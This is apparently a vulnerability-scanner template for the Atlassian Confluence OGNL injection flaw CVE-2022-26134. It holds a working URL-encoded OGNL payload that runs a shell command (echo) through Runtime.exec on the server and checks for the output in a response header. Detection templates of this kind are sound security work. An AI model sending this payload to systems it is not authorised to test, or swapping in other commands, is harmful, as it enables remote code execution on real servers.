name: Atlassian_Confluence_Webwork_OGNL_Inject__CVE_2022_26134
transport: http
set: {}
detail:
  dock: app="Confluence"
  product: atlassian-confluence
  homepage: https://www.atlassian.com/zh/software/confluence
  impact: '<p><span style="color: rgb(22, 51, 102); font-size: 16px;">Atlassian confluence
    has an ognl injection vulnerability that allows authenticated users (in some cases
    unauthenticated users) to execute arbitrary code on the confluence server.</span><br></p>'
  description: <p>Atlassian confluence server is a server version of atlassian company
    that has enterprise knowledge management functions and supports collaborative
    software for building enterprise wikis.&nbsp;</p><p>Atlassian confluence has an
    ognl injection vulnerability that allows authenticated users (in some cases unauthenticated
    users) to execute arbitrary code on the confluence server.<br></p>
rules:
  r1:
    method: GET
    path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20TTTest%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Test-Response%22%2C%23a%29%29%7D/
    follow_redirects: false
    expression: 'response.status == 302 && response.raw_header.bcontains(b''X-Test-Response:
      TTTest'')'
expression: r1()
